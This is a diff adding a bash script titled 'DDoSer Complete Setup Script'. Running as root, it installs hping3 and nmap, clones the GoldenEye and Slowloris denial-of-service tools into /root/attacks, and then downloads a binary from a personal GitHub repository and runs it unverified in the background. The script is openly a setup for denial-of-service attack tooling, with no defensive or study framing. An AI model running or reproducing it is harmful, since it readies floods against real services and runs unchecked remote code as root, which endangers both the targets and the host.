@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# DDoSer Complete Setup Script
+# Direct installation script - download and run
+
+# Change to root directory
+cd /root
+
+# Update package lists and install required packages
+apt-get update
+apt-get install -y hping3 python3 python3-pip python3-venv python3-dev python3-setuptools python3-wheel nmap curl git python3-urllib3 iftop vnstat net-tools bmon iperf3 ifstat tcpdump mtr nginx jq
+
+# Create attacks directory
+mkdir -p /root/attacks
+
+# Clone attack tools
+cd /root/attacks
+
+# Clone GoldenEye
+if [ ! -d "GoldenEye" ]; then
+    git clone https://github.com/jseidl/GoldenEye.git
+    cd GoldenEye && chmod +x goldeneye.py
+    cd /root/attacks
+fi
+
+# Clone Slowloris
+if [ ! -d "slowloris" ]; then
+    git clone https://github.com/gkbrk/slowloris.git
+    cd slowloris && pip3 install -r requirements.txt
+    cd /root/attacks
+fi
+
+# Create test script
+cat > /root/attacks/test.sh << 'EOF'
+#!/bin/bash
+echo "Test script executed successfully"
+EOF
+chmod +x /root/attacks/test.sh
+
+# Add PATH export
+echo 'export PATH=$PATH:/usr/sbin' >> /root/.bashrc
+
+# Download and setup Network Monitor API
+cd /root
+
+# Download the network-monitor-api binary
+wget https://raw.githubusercontent.com/berkotako/network-monitor/refs/heads/main/network-monitor-api -O /root/network-monitor-api
+
+# Check if download was successful
+if [ $? -eq 0 ]; then
+    # Make it executable
+    chmod +x /root/network-monitor-api
+    
+    # Check if file is executable
+    if [ -x /root/network-monitor-api ]; then
+        # Start the network-monitor-api as a background process
+        nohup /root/network-monitor-api > /root/network-monitor.log 2>&1 &
+        
+        # Get the process ID
+        NETWORK_MONITOR_PID=$!
+        
+        # Check if process started successfully
+        sleep 2
+        if ps -p $NETWORK_MONITOR_PID > /dev/null; then
+            echo "Network Monitor API started successfully with PID: $NETWORK_MONITOR_PID"
+        else
+            echo "Failed to start Network Monitor API"
+            exit 1
+        fi
+    else
+        echo "Failed to make Network Monitor API executable"
+        exit 1
+    fi
+else
+    echo "Network Monitor API download failed"
+    exit 1
+fi
+
+echo "DDoSer Setup Completed Successfully!"
+echo "Attack tools installed in /root/attacks/"
+echo "Network Monitor API running in background"
+echo "Log file: /root/network-monitor.log" 
